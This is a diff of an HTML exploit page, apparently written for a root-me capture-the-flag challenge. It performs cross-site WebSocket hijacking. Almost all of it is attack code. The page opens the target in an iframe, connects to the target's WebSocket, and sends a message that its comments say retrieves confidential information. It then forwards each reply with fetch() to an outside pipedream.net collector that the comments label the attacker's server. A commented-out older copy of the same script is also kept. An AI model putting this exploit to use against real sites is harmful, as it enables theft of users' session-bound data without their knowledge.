@@ -3,19 +3,42 @@
 <meta http-equiv="Content-Security-Policy" content="default-src * data: mediastream: blob: filesystem: about: ws: wss: 'unsafe-eval' 'wasm-unsafe-eval' 'unsafe-inline'; connect-src * data: blob: 'unsafe-inline';">
 <META HTTP-EQUIV="Access-Control-Allow-Origin" CONTENT="http://ctf21.root-me.org/room">
 
-<script>
-	var ws = new WebSocket('ws://ctf21.root-me.org/ws');
-	ws.onopen = start
-	ws.onmessage = handleReply
-	function start(event) {
-	  ws.send('hello'); //Send the message to retreive confidential information
-	}
-	function handleReply(event) {
-	  //Exfiltrate the confidential information to attackers server
-	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
-	}
-</script>
-
+<body>
+	<script type="text/javascript">
+		var iframe = document.createElement('iframe');
+        iframe.src = 'http://ctf21.root-me.org/room';
+        iframe.height = '80%';
+        iframe.width = '80%';
+        iframe.onload = function() {
+        	var ws = new WebSocket('ws://ctf21.root-me.org/ws');
+			ws.onopen = start
+			ws.onmessage = handleReply
+			function start(event) {
+			  ws.send('hello'); //Send the message to retreive confidential information
+			}
+			function handleReply(event) {
+			  //Exfiltrate the confidential information to attackers server
+			  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?cba='+event.data, {mode: 'no-cors'})
+			}
+        };
+        document.getElementsByTagName('body')[0].appendChild(iframe);
+	</script>
+	
+	<!--
+	<script>
+		var ws = new WebSocket('ws://ctf21.root-me.org/ws');
+		ws.onopen = start
+		ws.onmessage = handleReply
+		function start(event) {
+		  ws.send('hello'); //Send the message to retreive confidential information
+		}
+		function handleReply(event) {
+		  //Exfiltrate the confidential information to attackers server
+		  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
+		}
+	</script>
+	-->
+</body>
 
 <!--
 
